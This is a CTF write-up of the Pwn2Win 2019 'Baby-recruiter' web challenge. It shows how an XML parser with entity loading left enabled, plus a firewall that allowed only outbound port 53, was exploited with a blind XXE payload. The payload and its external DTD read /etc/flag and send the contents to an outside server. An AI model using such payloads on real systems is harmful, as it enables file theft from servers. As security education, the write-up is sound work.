# Pwn2Win2019_Baby-recruiter Write-up
Web challenge solved during Pwn2Win 2019 CTF (by Ganesh - USP)

## Challenge description
```
We found a Curriculum service from HARPA. Well, what do you think about pwn it? :)

P.S.: the flag is not in default format, so add CTF-BR{} when you find it (leet speak).

```

## Write-up
Firstly, the challenge gave us three files: Dockerfile, index.php e iptables.sh (there was also an setup.sh but it wasn't useful).
By looking at the Dockerfile we noticed that:
1. It installed a version of prince that might have a vulnerability, such as [this one](https://www.corben.io/XSS-to-XXE-in-Prince/), but we were wrong. It didn't;
2. The location of the flag (/etc/flag);
3. The setup/configuration of iptables.

``` sh
# there was some other stuff here, but we don't need it now
RUN wget https://www.princexml.com/download/prince_12.5-1_ubuntu18.04_amd64.deb

RUN echo -n 'this_is_not_the_flag' > /etc/flag

RUN chmod +x iptables.sh && ./iptables.sh
```
Also, after analizing the iptables.sh file, we noticed that it was only possible to establish new connections through port 53 (used for DNS) and port 80. However, in port 80 the server only responded to already established connections.
``` sh
## This should be one of the first rules.
## so dns lookups are already allowed for your other rules
$IPT -A OUTPUT -p udp --dport 53 -m state --state NEW,ESTABLISHED -j ACCEPT
$IPT -A INPUT  -p udp --sport 53 -m state --state ESTABLISHED     -j ACCEPT
$IPT -A OUTPUT -p tcp --dport 53 -m state --state NEW,ESTABLISHED -j ACCEPT
$IPT -A INPUT  -p tcp --sport 53 -m state --state ESTABLISHED     -j ACCEPT

echo "Allowing new and established incoming connections to port 80"
$IPT -A INPUT  -p tcp -m multiport --dports 80 -m state --state NEW,ESTABLISHED -j ACCEPT
$IPT -A OUTPUT -p tcp -m multiport --sports 80 -m state --state ESTABLISHED     -j ACCEPT

```

After trying some stuff, we noticed that in the index.php file, there was code used for debug uncommented:
``` php
/* debug */
$dom = new DOMDocument();
$dom->loadXML($content, LIBXML_NOENT | LIBXML_DTDLOAD);
$info = simplexml_import_dom($dom);
```
So, we thought that we could try a **Blind XXE Injection**! The *$content* came from a *textarea* in the index.php page, so we just had to write our payload there and send it to the server. However, the server would only respond to reqs at port 53! Thus, we had to disable the DNS resolver in our machine - at port 53 - with `sudo systemctl stop systemd-resolved` and run a local server there.
Finaly, we send the payload:
``` xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://143.107.3.131:53/host.dtd">
<data>&send;</data>
```

And the server asked us for this .dtd file:
``` xml
<!ENTITY % file SYSTEM "file:///etc/flag">
<!ENTITY % eval "<!ENTITY send SYSTEM 'http://143.107.3.131:53/collect/%file;'>">
%eval;
``` 

And this gave us the **flag**!

Another way of solving it is available at [SigFlag Blog](https://www.sigflag.at/blog/2019/writeup-pwn2win-baby-recruiter/
)
